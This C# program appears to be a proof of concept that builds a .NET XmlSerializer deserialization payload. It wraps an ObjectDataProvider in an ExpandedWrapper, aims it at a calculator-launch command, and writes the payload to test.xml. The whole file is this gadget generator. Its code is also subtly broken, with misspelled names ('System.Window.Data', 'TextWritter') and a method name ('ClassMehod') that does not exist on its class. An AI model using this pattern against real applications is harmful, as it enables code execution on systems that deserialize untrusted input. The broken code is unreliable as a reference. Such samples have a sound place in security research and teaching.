using System;
using System.IO;
using System.Xml.Serialization;
using System.Window.Data;

namespace object_data_provider
{
    class Program
    {
        static void Main(string[] args)
        {
            ExpandedWrapper<TestClass, ObjectDataProvider> wrapper = new ExpandedWrapper<TestClass, ObjectDataProvider>();
            wrapper.ProjectedProperty0 = new ObjectDataProvider();
            wrapper.ProjectedProperty0.ObjectInstance = new TestClass();
            wrapper.ProjectedProperty0.MethodName = "ClassMehod";
            wrapper.ProjectedProperty0.MethodParameters.Add("/Applications/Calculator.app/");
            XmlSerializer serializer1 = new XmlSerializer(typeof(ExpandedWrapper<TestClass, ObjectDataProvider>));
            TextWritter textWriter = new StreamWriter("test.xml");
            serializer1.Serialize(textWriter, wrapper);
            textWriter.Close();
        }
    }

    [XmlRoot]
    public class TestClass
    {
        private string classname;
        private string name;
        private int age;
        [XmlAttribute]
        public string Classname { get => classname; set => classname = value; }
        [XmlElement]
        public string Name { get => name; set => name = value; }
        [XmlElement]
        public int Age { get => age; set => age = value; }
        public override string ToString()
        {
            return base.ToString();
        }
    }

}
